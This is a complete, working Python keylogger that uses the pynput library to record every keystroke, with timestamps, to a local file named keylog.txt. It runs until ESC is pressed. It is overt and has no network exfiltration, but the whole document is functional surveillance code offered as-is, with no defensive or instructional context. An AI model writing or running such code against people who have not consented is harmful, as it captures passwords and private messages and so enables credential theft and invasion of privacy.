from pynput import keyboard
from datetime import datetime

LogFile = "keylog.txt"

def on_press(key):
    try:
        with open(LogFile, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(LogFile, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False  

print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()